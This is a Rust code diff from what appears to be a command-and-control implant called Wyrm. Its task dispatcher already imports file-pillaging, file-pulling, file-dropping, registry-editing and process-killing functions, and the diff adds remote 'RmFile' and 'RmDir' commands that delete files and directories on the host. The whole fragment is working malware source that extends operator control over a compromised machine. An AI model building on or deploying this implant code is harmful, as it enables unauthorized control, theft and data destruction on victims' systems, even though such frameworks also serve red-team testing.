@@ -33,8 +33,8 @@ use crate::{
     native::{
         accounts::{ProcessIntegrityLevel, get_logged_in_username, get_process_integrity_level},
         filesystem::{
-            MoveCopyAction, change_directory, dir_listing, drop_file_to_disk, move_or_copy_file,
-            pillage, pull_file,
+            MoveCopyAction, PathParseType, change_directory, dir_listing, drop_file_to_disk,
+            move_or_copy_file, pillage, pull_file, rm_from_fs,
         },
         processes::{kill_process, running_process_details},
         registry::{reg_add, reg_del, reg_query},
@@ -245,6 +245,30 @@ impl Wyrm {
                         &task,
                         Some(WyrmResult::Err::<String>("Bad request".to_string())),
                     );
+                }
+                Command::RmFile => {
+                    if let Some(inner) = &task.metadata {
+                        let r = rm_from_fs(self, inner, PathParseType::File);
+                        self.push_completed_task(&task, r);
+                        continue;
+                    } else {
+                        self.push_completed_task(
+                            &task,
+                            Some(WyrmResult::Err::<String>("Bad request".to_string())),
+                        );
+                    }
+                }
+                Command::RmDir => {
+                    if let Some(inner) = &task.metadata {
+                        let r = rm_from_fs(self, inner, PathParseType::Directory);
+                        self.push_completed_task(&task, r);
+                        continue;
+                    } else {
+                        self.push_completed_task(
+                            &task,
+                            Some(WyrmResult::Err::<String>("Bad request".to_string())),
+                        );
+                    }
                 }
                 Command::Pull => {
                     if let Some(file_path) = &task.metadata {
